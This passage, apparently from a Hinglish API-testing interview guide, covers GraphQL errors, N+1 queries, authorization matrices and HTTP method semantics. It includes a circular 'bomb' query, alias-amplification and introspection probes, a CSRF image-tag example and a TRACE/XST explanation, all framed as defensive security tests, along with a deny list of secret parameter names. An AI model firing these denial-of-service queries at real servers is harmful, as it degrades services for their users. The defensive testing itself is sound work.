      "extensions": { "code": "FORBIDDEN" }
    }
  ]
}
```

Yahan `sale` mila, `customer` nahi mila. Ek HTTP status is situation ko express hi nahi kar
sakta — 200 bhi galat hai, 403 bhi galat hai. Isliye GraphQL ne status ko chhod ke body mein
`errors` array daal diya.

**QA ke liye iska direct matlab:**

```python
# GALAT — ye test kabhi fail nahi hoga, GraphQL hamesha 200 deta hai
def test_get_sale_bad():
    r = requests.post(GQL_URL, json={"query": QUERY}, headers=auth)
    assert r.status_code == 200        # useless assertion
    assert r.json()["data"]["sale"]["id"] == "s_1024"
    # ^ agar sale null hua to TypeError aayega, clean failure nahi


# SAHI — errors array PEHLE check karo, phir data
def assert_gql_ok(resp):
    """Har GraphQL test mein ye helper use karo."""
    assert resp.status_code == 200, f"transport failed: {resp.status_code} {resp.text[:400]}"
    payload = resp.json()

    # errors key ka hona hi failure hai — chahe data bhi aaya ho (partial success)
    errors = payload.get("errors")
    assert not errors, f"GraphQL errors: {json.dumps(errors, indent=2)}"

    assert payload.get("data") is not None, "data null hai — poori query fail hui"
    return payload["data"]


def test_get_sale_good():
    r = requests.post(GQL_URL, json={"query": QUERY, "variables": {"saleId": "s_1024"}},
                      headers=auth, timeout=30)
    data = assert_gql_ok(r)
    assert data["sale"]["id"] == "s_1024"
    assert data["sale"]["customer"] is not None, "partial failure — customer resolver ne null diya"
```

**Aur ek important negative test:** partial success ka test explicitly likho.

```python
def test_unauthorized_field_returns_null_with_error_not_full_failure():
    """Low-privilege user ko sale dikhna chahiye, customer contact nahi.
    Behaviour: data mein sale aaye, customer null ho, errors mein FORBIDDEN ho."""
    r = requests.post(GQL_URL, json={"query": QUERY, "variables": {"saleId": "s_1024"}},
                      headers=low_privilege_auth, timeout=30)

    assert r.status_code == 200
    payload = r.json()

    assert payload["data"]["sale"]["id"] == "s_1024"          # sale dikha
    assert payload["data"]["sale"]["customer"] is None        # contact nahi dikha
    codes = [e["extensions"]["code"] for e in payload["errors"]]
    assert "FORBIDDEN" in codes                                # aur reason bataya gaya
```

### N+1 problem

Ye GraphQL ka signature performance bug hai.

```graphql
query {
  projects(limit: 100) {      # 1 DB query — 100 projects
    id
    name
    sales {                    # har project ke liye ALAG query!
      id
      totalPrice
    }
  }
}
```

GraphQL resolvers field-by-field chalte hain. `projects` resolver 1 query karta hai. Phir har
project ke liye `sales` resolver alag se chalta hai — 100 aur queries. Total = **1 + N = 101
queries**.

Client ko dikhta hai: ek request, ek 200 response. Andar 101 DB hits. Ye load pe hi phatta hai.

**Fix:** DataLoader pattern — resolver calls ko ek tick mein batch karke ek `IN (...)` query
bana dena.

**QA kaise pakde:**

```python
def test_nested_query_does_not_explode_db_queries():
    """Nesting depth badhne pe response time linearly badhna chahiye, exponentially nahi."""
    flat = """query { projects(limit: 50) { id name } }"""
    nested = """query { projects(limit: 50) { id name sales { id totalPrice } } }"""

    t_flat = timed_gql(flat)
    t_nested = timed_gql(nested)

    # ek extra nesting level 20x slow nahi hona chahiye — ye N+1 ka signature hai
    assert t_nested < t_flat * 5, (
        f"Nested query {t_nested/t_flat:.1f}x slower — likely N+1, DataLoader missing"
    )
```

Behtar approach agar access ho: **query count directly measure karo**. Staging pe DB slow-query
log ya APM (New Relic/Datadog) mein ek GraphQL request ka span dekho — agar 100 DB spans hain
ek request mein, N+1 confirmed. Ye prose se zyada strong evidence hai bug report mein.

### Depth-limit DoS

GraphQL mein schema circular ho sakta hai: Sale -> Customer -> Sales -> Customer -> ...

```graphql
# Malicious query — ek request se server down
query Bomb {
  sale(id: "s_1") {
    customer {
      sales {
        customer {
          sales {
            customer {
              sales {
                customer { sales { customer { sales { id } } } } } } } } } } }
}
```

Ye exponential blowup hai. Ek unauthenticated request se server ki memory aur DB khatam.

**Ye ek REAL security test hai jo QA kar sakta hai:**

```python
def build_nested_query(depth: int) -> str:
    """Deliberately deep circular query banao."""
    inner = "id"
    for _ in range(depth):
        inner = f"customer {{ sales {{ {inner} }} }}"
    return f'query {{ sale(id: "s_1024") {{ {inner} }} }}'


@pytest.mark.security
@pytest.mark.parametrize("depth", [5, 10, 20, 50])
def test_deep_query_is_rejected_before_execution(depth):
    """Server ko depth limit enforce karni chahiye — validation phase mein,
    execution se PEHLE. Agar 200 aa raha hai to depth limiting nahi hai."""
    r = requests.post(GQL_URL, json={"query": build_nested_query(depth)},
                      headers=auth, timeout=30)

    if depth <= 5:
        assert r.json().get("errors") is None
    else:
        errors = r.json().get("errors")
        assert errors, f"Depth {depth} accept ho gaya — no depth limit. DoS vector."
        assert any("depth" in e["message"].lower() or "complex" in e["message"].lower()
                   for e in errors)


@pytest.mark.security
def test_alias_amplification_is_limited():
    """Aliases se ek hi field ko 1000 baar maang sakte ho — depth limit isko nahi rokta.
    Query complexity/cost analysis chahiye."""
    aliases = "\n".join(f'a{i}: sale(id: "s_1024") {{ id totalPrice spine {{ milestones {{ id }} }} }}'
                        for i in range(500))
    r = requests.post(GQL_URL, json={"query": f"query {{ {aliases} }}"},
                      headers=auth, timeout=60)
    assert r.json().get("errors"), "500 aliases accept ho gaye — no query cost limit"


@pytest.mark.security
def test_introspection_disabled_in_production():
    """Introspection production mein band hona chahiye — warna attacker ko
    poora schema mil jaata hai, including hidden/internal fields."""
    introspection = '{"query":"{ __schema { types { name fields { name } } } }"}'
    r = requests.post(PROD_LIKE_GQL_URL, data=introspection,
                      headers={**auth, "Content-Type": "application/json"}, timeout=30)
    assert r.json().get("errors") or r.json().get("data") is None, \
        "Introspection production mein enabled hai — schema fully exposed"
```

### Field-level authorization testing

Ye GraphQL ka sabse under-tested area hai — aur senior interview mein **isse impress kiya ja
sakta hai**.

REST mein authorization endpoint-level hoti hai: `/api/v1/sales/{id}` allowed hai ya nahi.
GraphQL mein ek hi query se aap kuch bhi maang sakte ho, isliye authorization **har field pe**
lagni chahiye.

Common bug: `sale` query pe auth check hai, lekin `sale.customer.emailAddress` pe nahi —
kyunki wo ek nested resolver hai jise koi alag se guard karna bhool gaya.

```python
# Har role x har sensitive field ka matrix
SENSITIVE_FIELDS = {
    "sale { customer { emailAddress } }":  ["ADMIN", "SALES_MANAGER"],
    "sale { customer { phone } }":         ["ADMIN", "SALES_MANAGER"],
    "sale { internalMargin }":             ["ADMIN"],
    "sale { totalPrice }":                 ["ADMIN", "SALES_MANAGER", "SITE_ENGINEER"],
}
ALL_ROLES = ["ADMIN", "SALES_MANAGER", "SITE_ENGINEER", "VIEWER"]


@pytest.mark.parametrize("field_selection,allowed_roles",
                         list(SENSITIVE_FIELDS.items()))
@pytest.mark.parametrize("role", ALL_ROLES)
def test_field_level_authorization_matrix(field_selection, allowed_roles, role, token_for):
    """Har role, har sensitive field. 4 roles x 4 fields = 16 tests, ek matrix se."""
    # NOTE: backslash f-string expressions ke andar allowed nahi hain (Python <3.12),
    # isliye replacement pehle alag variable mein banao
    targeted = field_selection.replace('sale {', 'sale(id: "s_1024") {', 1)
    query = f"query {{ {targeted} }}"
    r = requests.post(GQL_URL, json={"query": query},
                      headers={"Authorization": f"Bearer {token_for(role)}"}, timeout=30)
    payload = r.json()

    if role in allowed_roles:
        assert not payload.get("errors"), f"{role} ko access hona chahiye tha: {payload.get('errors')}"
        assert payload["data"]["sale"] is not None
    else:
        # value LEAK nahi honi chahiye — ya error, ya null
        leaked = _extract_leaf_value(payload.get("data"))
        assert leaked is None, f"LEAK: role {role} ko '{field_selection}' ki value mil gayi: {leaked}"
```

### GraphQL vs REST — QA perspective

| Aspect | REST | GraphQL |
|---|---|---|
| Endpoints | Kai | Ek (`/graphql`) |
| Status codes | Meaningful | Almost always 200 — **useless as assertion** |
| Error location | HTTP status + body | `errors[]` array in body |
| Partial success | Possible nahi | **Normal** — data + errors saath |
| Over-fetching | Common | Client control karta hai |
| Caching | HTTP caching kaam karti hai | POST hai, HTTP caching kaam nahi karti — app-level chahiye |
| Authorization | Endpoint-level | **Field-level — har resolver pe** |
| DoS surface | Rate limiting kaafi hai | Depth limit + query cost + aliases + rate limit |
| Contract | OpenAPI (optional, stale) | Schema — **mandatory, always accurate** |
| Introspection | — | Schema self-documenting; prod mein disable karo |
| Versioning | `/v1`, `/v2` | Field deprecation (`@deprecated`) — no versions |
| N+1 | Backend ka internal issue | **Query shape se trigger hota hai** — client-visible |

> **Interview answer:**
>
> "GraphQL flips who decides the response shape — the client specifies exactly which fields it
> wants, from a single endpoint, usually a POST to `/graphql`. Queries read, mutations write,
> subscriptions push over a websocket.
>
> The thing that changes my testing most is that errors come back with HTTP 200. That's not
> sloppiness — a GraphQL response can be genuinely partial, where one field resolves and a
> nested one fails authorization. A single HTTP status can't express 'mostly worked'. So the
> practical consequence is that `assert status_code == 200` is a worthless assertion in
> GraphQL. Every one of my GraphQL tests goes through a helper that first asserts the `errors`
> array is absent, then asserts `data` isn't null, and only then looks at values. And I write
> explicit tests for the partial case — asserting that a restricted field comes back null
> *with* a FORBIDDEN error, rather than the whole query failing.
>
> Three areas I'd specifically own as a tester. First, N+1: because the query shape drives
> resolver execution, adding one nesting level can turn one database query into a hundred and
> one. I test that by comparing response time between a flat and a nested query, and if I have
> APM access I'd rather count the database spans in a single request trace — that's much
> stronger evidence in a bug report. Second, denial of service: circular schema types let you
> write an exponentially deep query, so I test that the server rejects queries past a depth
> limit at validation time, before execution. Depth limits alone aren't enough though —
> aliases let you request the same expensive field five hundred times at depth one, so I test
> for query cost analysis too, and I check that introspection is disabled in production. Third,
> field-level authorization: in REST authorization is per endpoint, but in GraphQL any client
> can compose any field selection, so every resolver needs its own check. Nested resolvers are
> where teams forget. I drive that as a parametrized matrix of roles against sensitive field
> selections, and I assert on the actual leaked value rather than just on the presence of an
> error."

> **Cross-question: "How is GraphQL's schema different from OpenAPI for contract testing?"**
>
> "The GraphQL schema is enforced by the runtime, so it can't drift — if a field isn't in the
> schema, the server rejects the query. OpenAPI is a document that someone maintains alongside
> the code, so it can and does go stale. That makes GraphQL structurally better for contract
> confidence, but it only covers types and nullability. It says nothing about business
> semantics — a field can be typed correctly and hold the wrong value. And in fact nullability
> is where I'd focus: GraphQL makes most fields nullable by default, so a resolver that fails
> silently returns null and the schema is perfectly satisfied. That's exactly the failure mode
> I hit at Merlin, where a customer-facing endpoint returned `totalPrice: null` for a contract
> that had a real value. Schema validation would have passed that. Only a business assertion
> catches it."

---

# PART 2 — HTTP Methods

## 2.1 Teen properties jo sab kuch decide karti hain

Har method ki teen properties hoti hain. Interview mein ye definitions **exactly** aani chahiye
kyunki log inhe mix karte hain.

| Property | Definition | Yaad rakhne ka tareeka |
|---|---|---|
| **Safe** | Server ka state **change nahi karta**. Read-only. | "Main ye 1000 baar chala doon, kuch nahi bigdega" |
| **Idempotent** | **Ek baar ya N baar — server ka final state same.** Response alag ho sakta hai. | "Effect ek hi baar hoga" |
| **Cacheable** | Response store karke reuse kiya ja sakta hai | "Proxy isko yaad rakh sakta hai" |

**Sabse zaroori clarification — ye cross-question hamesha aata hai:**

> Idempotent ka matlab **same response** nahi hai. Matlab **same server state** hai.
>
> `DELETE /sales/s_1` pehli baar → `204 No Content`, sale delete ho gaya.
> `DELETE /sales/s_1` doosri baar → `404 Not Found`.
>
> **Response alag hai. Phir bhi DELETE idempotent hai** — kyunki dono baar ke baad final state
> wahi hai: sale exist nahi karta.

Aur: **safe hone ka matlab hai idempotent hona** (agar state change hi nahi hota, to N baar
chalane se bhi nahi hoga). Ulta sach nahi — DELETE idempotent hai lekin safe nahi.

```
            ┌─────────────────────────────────────┐
            │            IDEMPOTENT               │
            │  ┌──────────────┐                   │
            │  │     SAFE     │   PUT             │
            │  │  GET  HEAD   │   DELETE          │
            │  │  OPTIONS     │                   │
            │  └──────────────┘                   │
            └─────────────────────────────────────┘

                 POST    PATCH*      <- na safe, na idempotent

  * PATCH idempotent ho SAKTA hai, depends on payload:
      {"status": "CLOSED"}   -> idempotent (absolute set)
      {"$inc": {"qty": 1}}   -> NOT idempotent (relative change)
```

## 2.2 Complete methods table

| Method | Safe | Idempotent | Cacheable | Body in request | Body in response | Typical success |
|---|---|---|---|---|---|---|
| **GET** | Yes | Yes | Yes | No (ignore kiya jaata hai) | Yes | 200 |
| **HEAD** | Yes | Yes | Yes | No | **No** (headers only) | 200 |
| **OPTIONS** | Yes | Yes | No | No | Yes (ya empty) | 200 / 204 |
| **POST** | **No** | **No** | Rarely (explicit headers ke saath) | Yes | Yes | 201 (create) / 200 / 202 |
| **PUT** | No | **Yes** | No | Yes | Optional | 200 / 204 / 201 |
| **PATCH** | No | **Not guaranteed** | No | Yes | Optional | 200 / 204 |
| **DELETE** | No | **Yes** | No | Rarely | Optional | 204 / 200 |
| **TRACE** | Yes | Yes | No | No | Yes | 200 — **prod mein disable hona chahiye** |
| **CONNECT** | No | No | No | — | — | Proxy tunneling ke liye |

## 2.3 Har method — misuse se aane wala real bug

### GET — safe hona chahiye, lekin nahi hai

**Bug pattern:** `GET /api/v1/sales/{id}/close` — action ko GET pe rakh diya.

**Kya toota:**
- Browser prefetch / link preview crawler URL hit kar deta hai → sale accidentally close ho jaati hai
- Ye ek **CSRF vector** hai — attacker `<img src="https://app/api/v1/sales/s_1/close">` embed kar deta hai, victim ke browser cookies ke saath request chali jaati hai
- Proxy/CDN GET ko cache kar sakta hai → close ka result kisi aur ko serve
- User back button dabata hai → dubara execute

**Test:**
```python
@pytest.mark.security
@pytest.mark.parametrize("path", [
    "/api/v1/sales/{sale_id}/close",
    "/api/v1/budgets/{budget_id}/carve",
    "/api/v1/budgets/{budget_id}/convert-to-offer",
])
def test_state_changing_endpoints_reject_get(api, path, sale_id, budget_id):
    """State badalne wala koi bhi endpoint GET accept nahi karna chahiye.
    405 Method Not Allowed expected — 200 aaya to CSRF vector hai."""
    r = api.get(path.format(sale_id=sale_id, budget_id=budget_id))
    assert r.status_code == 405, (
        f"{path} GET pe respond kar raha hai ({r.status_code}) — CSRF/prefetch risk"
    )
    # 405 ke saath Allow header aana chahiye
    assert "POST" in r.headers.get("Allow", "")
```

**Doosra GET bug:** sensitive data query params mein.

```
GALAT: GET /api/v1/auth/verify?token=eyJhbGci...
```
Token ab: browser history mein, server access logs mein, proxy logs mein, aur `Referer` header
ke through third-party analytics mein chala jaata hai.

```python
@pytest.mark.security
def test_no_secrets_in_query_string(api):
    """Koi bhi secret URL mein nahi jana chahiye — logs mein leak ho jaata hai."""
    r = api.get("/api/v1/projects/p_1/sales")
    parsed = urlparse(r.request.url)
    params = parse_qs(parsed.query)
    forbidden = {"token", "password", "secret", "apikey", "api_key", "access_token", "jwt"}
    leaked = forbidden & {k.lower() for k in params}
    assert not leaked, f"Secrets query string mein: {leaked}"
```

### POST — non-idempotent, duplicate creation

**Bug pattern:** user "Submit" pe double-click karta hai. Do carves ban jaate hain.

**Kya toota:** duplicate financial records. Construction ERP mein iska matlab budget do baar
carve ho gaya — accounting galat.

> **[REAL]** Merlin mein `POST /api/v1/budgets/{id}/carve` pe ye class ka bug possible tha,
> lekin backend ne isko **DB-level unique partial index** se handle kiya. Maine ek concurrency
> test likha: same scope pe do carves exactly simultaneously bheje — **exactly ek jeeta,
> doosre ko 409 mila**. Ye test pass hua, aur ye ek achha example hai ki concurrency safety
> application code mein try-catch se nahi, database constraint se aani chahiye.

```python
import concurrent.futures

def test_concurrent_carve_exactly_one_wins(api, budget_id, scope_id):
    """[REAL pattern] Do concurrent carves same scope pe.
    Expected: exactly ek 201, exactly ek 409.
    Ye DB-level unique partial index se enforce hota hai, application check se nahi —
    kyunki application-level 'pehle check phir insert' mein check aur insert ke beech
    race window hota hai."""
    payload = {"scopeId": scope_id, "amount": 250000, "currency": "INR"}

    def carve():
        return api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        futures = [ex.submit(carve) for _ in range(2)]
        responses = [f.result() for f in futures]

    codes = sorted(r.status_code for r in responses)
    assert codes == [201, 409], f"Expected exactly one winner, got {codes}"

    # Aur DB state verify karo — sirf status codes pe bharosa mat karo
    listing = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
    carves_for_scope = [c for c in listing["carves"] if c["scopeId"] == scope_id]
    assert len(carves_for_scope) == 1, f"Duplicate carves ban gaye: {len(carves_for_scope)}"
```

**Fix jab DB constraint na ho:** `Idempotency-Key` header (Part 8 mein detail).

### PUT vs PATCH — data loss bug

Ye **sabse commonly asked** method question hai, aur uska real bug.

| | PUT | PATCH |
|---|---|---|
| Semantics | **Poora resource replace** | **Partial update** |
| Missing fields ka matlab | "Ise hata do / default kar do" | "Ise chhedo mat" |
| Idempotent | Yes | Depends on payload |
| Typical bug | **Silent data loss** | Inconsistent partial state |

**Data loss ka exact scenario:**

Server pe sale ka current state:
```json
{
  "id": "s_1024",
  "status": "OPEN",
  "totalPrice": 4500000,
  "customerId": "c_88",
  "poNumber": "PO-2026-0431",
  "retentionPercent": 5,
  "notes": "Phase 2 civil"
}
```

Frontend developer sirf status badalna chahta hai. Wo PUT bhejta hai:
```http
PUT /api/v1/sales/s_1024
Content-Type: application/json

{"status": "CLOSED"}
```

**Correct PUT semantics ke hisaab se ab resource ye hona chahiye:**
```json
{"id": "s_1024", "status": "CLOSED"}
```

`poNumber` gaya. `retentionPercent` gaya. `notes` gaye. `totalPrice` gaya. **Silent data
loss** — koi error nahi, 200 aaya, sab theek dikha.

Aur asli khatarnaak version: server ne PUT ko PATCH ki tarah implement kiya (missing fields
ignore kar diye). Ab API "kaam kar rahi hai", lekin **jab koi client genuinely field remove
karna chahega, wo nahi kar payega** — aur koi ye bug tab tak nahi pakdega.

```python
def test_put_replaces_entire_resource(api, sale_id):
    """PUT ka contract: jo bheja wahi resource hai. Missing fields hat jaane chahiye
    (ya server ko 400 dena chahiye required field missing hone pe).
    Beech ka behaviour — 'chupchap purani value rakh lena' — sabse bura hai,
    kyunki wo PUT ko PATCH bana deta hai bina bataye."""
    before = api.get(f"/api/v1/sales/{sale_id}").json()
    assert before["poNumber"], "precondition: sale ka poNumber set hona chahiye"

    r = api.put(f"/api/v1/sales/{sale_id}", json={"status": "CLOSED"})

    if r.status_code == 400:
        # Ye acceptable hai — server keh raha hai "PUT mein poora object do"
        return

    assert r.status_code in (200, 204)
    after = api.get(f"/api/v1/sales/{sale_id}").json()

    assert after.get("poNumber") in (None, ""), (
        "PUT ne poNumber preserve kar liya — server PUT ko PATCH ki tarah treat kar raha hai. "
        "Iska matlab clients kabhi field clear nahi kar payenge."
    )


def test_patch_preserves_unmentioned_fields(api, sale_id):
    """PATCH ka contract: jo nahi bheja usse mat chhedo."""
    before = api.get(f"/api/v1/sales/{sale_id}").json()

    r = api.patch(f"/api/v1/sales/{sale_id}", json={"notes": "updated by test"})
    assert r.status_code in (200, 204)

    after = api.get(f"/api/v1/sales/{sale_id}").json()
    assert after["notes"] == "updated by test"
    assert after["poNumber"] == before["poNumber"], "PATCH ne unmentioned field uda diya"
    assert after["totalPrice"] == before["totalPrice"]
    assert after["retentionPercent"] == before["retentionPercent"]


def test_patch_explicit_null_clears_field(api, sale_id):
    """Sabse subtle PATCH bug: JSON mein 'field absent' aur 'field: null' alag cheezein hain.
    Absent = mat chhedo. null = clear kar do.
    Bahut saare backends dono ko same treat karte hain — matlab client kabhi
    field clear nahi kar sakta."""
    api.patch(f"/api/v1/sales/{sale_id}", json={"notes": "something"})

    r = api.patch(f"/api/v1/sales/{sale_id}", json={"notes": None})
    assert r.status_code in (200, 204)

    after = api.get(f"/api/v1/sales/{sale_id}").json()
    assert after["notes"] is None, (
        "Explicit null ne field clear nahi kiya — backend absent aur null ko "
        "distinguish nahi kar raha"
    )
```

**JSON Merge Patch vs JSON Patch** — PATCH ke do standard formats hain, aur QA ko farq pata
hona chahiye:

```http
# JSON Merge Patch (RFC 7386) — Content-Type: application/merge-patch+json
PATCH /api/v1/sales/s_1024
{"notes": "updated", "poNumber": null}
# null ka matlab: field hatao. Arrays ko replace karta hai, merge nahi.

# JSON Patch (RFC 6902) — Content-Type: application/json-patch+json
PATCH /api/v1/sales/s_1024
[
  {"op": "replace", "path": "/notes", "value": "updated"},
  {"op": "remove",  "path": "/poNumber"},
  {"op": "add",     "path": "/tags/-", "value": "urgent"},
  {"op": "test",    "path": "/status", "value": "OPEN"}
]
# 'test' op optimistic locking deta hai — agar status OPEN nahi hai, poora patch fail
```

Zyadatar APIs plain `application/json` bhejti hain aur merge-patch semantics assume karti hain
bina declare kiye. **Ye test-worthy hai:** array ke saath kya hota hai? `{"tags": ["a"]}`
bhejne pe purane tags replace hote hain ya merge?

### DELETE — idempotency aur soft delete

**Bug pattern 1:** doosri DELETE call pe 500.

```python
def test_delete_is_idempotent(api, disposable_sale_id):
    """DELETE do baar. Dono baar server crash nahi hona chahiye.
    Pehli baar 204/200, doosri baar 404 ya 204 — dono acceptable.
    500 kabhi acceptable nahi."""
    first = api.delete(f"/api/v1/sales/{disposable_sale_id}")
    assert first.status_code in (200, 204)

    second = api.delete(f"/api/v1/sales/{disposable_sale_id}")
    assert second.status_code in (200, 204, 404), (
        f"Repeat DELETE pe {second.status_code} — idempotency toot rahi hai"
    )
    assert second.status_code != 500
```

**Bug pattern 2 — ye zyada serious hai:** soft delete ke baad bhi record queries mein aata hai.

```python
def test_soft_deleted_record_disappears_from_all_read_paths(api, project_id, sale_id):
    """Soft delete ka classic bug: record ek jagah se gayab hota hai, doosri jagah rehta hai.
    Kyunki har query mein 'deletedAt IS NULL' filter lagana yaad rakhna padta hai,
    aur ek jagah bhool jaana normal hai."""
    api.delete(f"/api/v1/sales/{sale_id}")

    # Direct fetch
    assert api.get(f"/api/v1/sales/{sale_id}").status_code == 404

    # Listing
    listing = api.get(f"/api/v1/projects/{project_id}/sales").json()
    assert sale_id not in [s["id"] for s in listing["items"]]

    # Search / filter path — alag query builder use karta hai, aksar filter miss karta hai
    search = api.get(f"/api/v1/projects/{project_id}/sales", params={"q": "test"}).json()
    assert sale_id not in [s["id"] for s in search["items"]]

    # Aggregation / reporting path — ye sabse zyada miss hota hai
    coverage = api.get(f"/api/v1/budgets/{BUDGET_ID}/coverage").json()
    assert sale_id not in json.dumps(coverage), "Deleted sale abhi bhi aggregation mein hai"

    # Export path
    export = api.get(f"/api/v1/projects/{project_id}/sales/export")
    assert sale_id not in export.text
```

**Bug pattern 3:** DELETE dependent data ko orphan chhod deta hai.

```python
def test_delete_parent_handles_children_explicitly(api, project_id):
    """Parent delete karne pe children ka kya hota hai?
    Teen valid designs hain: cascade delete, 409 block, ya orphan-with-null.
    Sabse bura: silently orphan chhod dena bina policy ke —
    kyunki phir wo records kisi report mein null-pointer bana denge."""
    r = api.delete(f"/api/v1/projects/{project_id}")

    if r.status_code == 409:
        # Design: block — acceptable, agar error message batata ho kyun
        assert "sale" in r.json()["message"].lower()
        return

    assert r.status_code in (200, 204)
    # Cascade hua? children bhi gayab hone chahiye
    child = api.get(f"/api/v1/sales/{KNOWN_CHILD_SALE_ID}")
    assert child.status_code == 404, "Parent delete ho gaya lekin child orphan reh gaya"
```

### HEAD — GET se headers match hone chahiye

**Kya hai:** HEAD bilkul GET jaisa hai, lekin response mein **body nahi aata** — sirf headers.

**Kyun exist karta hai:**
- Bade file ka size check karna bina download kiye (`Content-Length`)
- Resource exist karta hai ya nahi, sasta check
- Cache validation — `ETag` / `Last-Modified` check karna bina poora payload liye
- Link checker / health check

**Bug pattern:** HEAD implement hi nahi kiya (405 aata hai), ya HEAD ke headers GET se match
nahi karte.

```python
def test_head_matches_get_headers_without_body(api, sale_id):
    """RFC ke hisaab se HEAD ka response GET ke response jaisa hona chahiye,
    bas body ke bina. Content-Length wahi hona chahiye jo GET mein hota."""
    head = api.head(f"/api/v1/sales/{sale_id}")
    get = api.get(f"/api/v1/sales/{sale_id}")

    assert head.status_code == get.status_code
    assert head.content == b"", "HEAD response mein body aa gaya — spec violation"

    for header in ("Content-Type", "ETag", "Cache-Control"):
        assert head.headers.get(header) == get.headers.get(header), (
            f"HEAD aur GET ka {header} match nahi kar raha — "
            f"caches confuse ho jayenge"
        )
```

**Ek subtle security angle:** HEAD kabhi-kabhi authorization checks bypass kar jaata hai,
kyunki framework GET pe filter lagata hai lekin HEAD ko alag route kar deta hai. Test karo:

```python
@pytest.mark.security
def test_head_respects_authorization(api_unauth, sale_id):
    """HEAD se resource ka existence leak nahi hona chahiye agar GET pe 403/404 hai."""
    get_r = api_unauth.get(f"/api/v1/sales/{sale_id}")
    head_r = api_unauth.head(f"/api/v1/sales/{sale_id}")
    assert head_r.status_code == get_r.status_code, (
        "HEAD aur GET ka authorization behaviour alag hai — existence oracle ban gaya"
    )
```

### OPTIONS — CORS preflight aur method discovery

**Kya hai:** batata hai ki is resource pe kaunse methods allowed hain. Do use hain:

1. **Method discovery** — `Allow: GET, POST, DELETE` header
2. **CORS preflight** — browser automatically bhejta hai (Part 8 mein detail)

**Bug pattern:** OPTIONS auth maangta hai. Ye CORS ko tod deta hai — kyunki browser preflight
request pe `Authorization` header bhejta hi nahi hai.

```python
@pytest.mark.parametrize("path", ["/api/v1/sales/s_1", "/api/v1/budgets/b_1/carve"])
def test_options_does_not_require_auth(path):
    """CORS preflight mein browser Authorization header nahi bhejta.
    Agar OPTIONS pe 401 aaya, browser se koi bhi cross-origin call kaam nahi karegi —
    aur ye bug curl se kabhi nahi dikhega."""
    r = requests.options(
        BASE_URL + path,
        headers={
            "Origin": "https://app.merlinai.co",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "authorization,content-type",
        },
        timeout=10,
    )
    assert r.status_code in (200, 204), (
        f"Preflight pe {r.status_code} — browser se cross-origin calls fail hongi"
    )
    assert r.headers.get("Access-Control-Allow-Origin")
    assert "POST" in r.headers.get("Access-Control-Allow-Methods", "")
```

### TRACE — production mein disabled hona chahiye

**Kya hai:** TRACE request ko wapas echo karta hai — debugging ke liye.

**Kyun khatarnaak:** **Cross-Site Tracing (XST)** attack. TRACE saare headers echo karta hai,
including `Cookie` — even `HttpOnly` cookies, kyunki wo response *body* mein aa jaate hain,
jahan JavaScript unhe padh sakta hai. HttpOnly ka poora protection bypass ho jaata hai.

```python
@pytest.mark.security
def test_trace_method_disabled():
    """TRACE production mein 405 ya 501 dena chahiye. Agar 200 aaya —
    HttpOnly cookie protection bypass ho sakta hai (XST)."""
    r = requests.request("TRACE", BASE_URL + "/api/v1/sales/s_1", timeout=10)
    assert r.status_code in (403, 405, 501), (
        f"TRACE enabled hai ({r.status_code}) — Cross-Site Tracing vector"
    )
```

> **Interview answer (methods):**
>
> "Every method has three properties: safe means it doesn't change server state; idempotent
> means one call and N identical calls leave the server in the same final state; cacheable
> means the response can be stored and reused. The distinction people get wrong is
> idempotency — it's about server state, not about the response. DELETE is idempotent even
> though the first call returns 204 and the second returns 404, because after both, the
> resource is gone either way. Safe implies idempotent, but not the reverse.
>
> GET, HEAD and OPTIONS are safe. PUT and DELETE are idempotent but not safe. POST is neither.
> PATCH is interesting — it's idempotent or not depending on the payload: setting a status to
> CLOSED is idempotent, incrementing a quantity is not.
>
> The bug I look for most is PUT versus PATCH. PUT replaces the whole resource, so a client
> sending only `{"status": "CLOSED"}` should end up with a resource that has only status —
> everything else, the PO number, retention percentage, notes, should be gone. That's silent
> data loss with a 200 response. The more insidious variant is when the server implements PUT
> as if it were PATCH and quietly preserves the missing fields. It looks like it's working,
> but it means no client can ever clear a field, and nobody discovers that until a customer
> needs to. So I test both directions explicitly: PUT must drop unmentioned fields or reject
> the request, and PATCH must preserve them — and separately, PATCH with an explicit null must
> actually clear the field, because plenty of backends treat 'absent' and 'null' identically."

> **Cross-question: "Is POST ever idempotent?"**
>
> "Not by the specification — the protocol makes no such guarantee, which is exactly why
> double-clicking a submit button creates two records. But you can make a specific POST
> endpoint behave idempotently, and there are two ways. The application-level way is an
> `Idempotency-Key` header: the client generates a UUID, the server stores the key with the
> result of the first request, and any retry with the same key returns the stored result
> instead of executing again — that's what Stripe does. The infrastructure-level way is a
> database uniqueness constraint, which is what our backend does for budget carves. There's a
> unique partial index, so two concurrent carves on the same scope produce exactly one 201 and
> one 409. I wrote that concurrency test and it passes. I'd argue the database constraint is
> the stronger design, because an application-level 'check then insert' has a race window
> between the check and the insert, and under real concurrency both requests can pass the
> check."

> **Cross-question: "Should a POST that creates nothing still return 201?"**
>
> "No. 201 means a resource was created and should carry a `Location` header pointing at it.
> A POST used as an action — like closing a sale — isn't creating a resource, so 200 with the
> updated representation is right, or 204 if there's nothing to return. And if the work is
> asynchronous, 202 Accepted with a status URL to poll. Using 201 for everything is a small
> thing, but it means clients can't rely on `Location`, so they end up guessing URLs — and
> that guessing is what breaks later."

---

# PART 3 — Request Anatomy

## 3.1 Headers — jo QA ko zaroor pata hone chahiye

### Content-Type — request body ka format

Ye batata hai ki **jo main bhej raha hoon** wo kis format mein hai.

| Value | Kab |
|---|---|
| `application/json` | Default modern APIs |
| `application/x-www-form-urlencoded` | HTML form submit, OAuth token endpoints |
| `multipart/form-data` | File upload (+ saath mein normal fields) |
| `text/plain` | Raw text |
| `application/xml` / `text/xml` | SOAP, legacy |
| `application/merge-patch+json` | RFC 7386 PATCH |
| `application/json-patch+json` | RFC 6902 PATCH |
| `application/octet-stream` | Raw binary |

**Bug pattern — content-type confusion:** server `Content-Type` ignore karke body ko sniff
karta hai. Ye ek **security issue** hai, sirf correctness ka nahi.

```python
@pytest.mark.security
def test_wrong_content_type_is_rejected(api, budget_id):
    """JSON body bhejo lekin Content-Type text/plain bolo.
    Server ko 415 Unsupported Media Type dena chahiye.
    Agar accept kar liya, matlab server content-type ignore kar raha hai —
    aur wahi CSRF protection ko bypass karta hai, kyunki simple content types
    (text/plain, form-urlencoded) CORS preflight trigger nahi karte."""
    r = requests.post(
